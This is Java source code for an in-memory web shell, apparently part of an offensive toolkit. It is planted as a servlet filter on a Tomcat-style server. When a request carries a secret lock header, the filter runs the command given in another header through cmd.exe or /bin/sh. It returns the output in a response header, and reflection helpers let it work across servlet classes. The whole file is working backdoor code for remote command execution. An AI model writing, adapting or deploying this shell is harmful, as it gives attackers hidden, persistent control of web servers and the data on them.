package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 */
@MemShell(MemShell.Filter)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class FilterExec implements InvocationHandler {
    private static String HEADER;
    private static String RHEADER;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("doFilter")) {
            run(args[0], args[1], args[2]);
        }
        return null;
    }

    /**
     * tomcat
     */
    private void run(Object servletRequest, Object servletResponse, Object filterChain) {
        try {
            String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return;
            }
            Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            String result = exec((String) header);
            invokeMethod(servletResponse, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
//            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Throwable e) {
//            doFilter(servletRequest, servletResponse, filterChain);
        }


    }

//    // TODO 需要测试 jakarta
//    public static void doFilter(Object servletRequest, Object servletResponse, Object filterChain){
//        try{
//            Class reqCls;
//            Class repCls;
//            try {
//                reqCls = Class.forName("javax.servlet.ServletRequest");
//                repCls = Class.forName("javax.servlet.ServletResponse");
//            }catch (Exception e){
//                reqCls = Class.forName("jakarta.servlet.ServletRequest");
//                repCls = Class.forName("jakarta.servlet.ServletResponse");
//            }
//
//            invokeMethod(filterChain.getClass(), filterChain, "doFilter", new Class[]{reqCls, repCls}, new Object[]{servletRequest, servletResponse});
//        }catch (Throwable e){
//
//        }
//    }


    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
